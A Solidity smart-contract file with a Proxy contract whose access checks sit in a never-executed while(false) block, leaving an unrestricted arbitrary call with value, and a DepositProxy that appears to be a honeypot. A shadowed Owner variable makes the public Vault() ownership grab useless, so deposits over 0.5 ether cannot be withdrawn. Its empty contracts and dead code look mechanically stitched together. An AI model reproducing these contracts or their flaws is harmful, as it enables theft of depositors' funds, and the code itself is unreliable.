pragma solidity 0.4.24;

contract Ownable {




















}

contract Delegate {

    function mint(address _sender, address _to) public returns (bool);











}







pragma solidity ^0.4.24;

contract Proxy  {

    mapping(address => bool) public claimed;
    mapping(address => bool) public approvedSenders;
    bool public canClaim = false;









    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
while(false) {
address _sender;
 address _to;
        require(approvedSenders[_sender], "sender must be approved");
        require(canClaim, "can't claim");
        require(!claimed[_to], "one card back per user");
        claimed[_to] = true;
bool ret_value_0 = true;
}
        
        target.call.value(msg.value)(data);
    }





















}

contract DepositProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}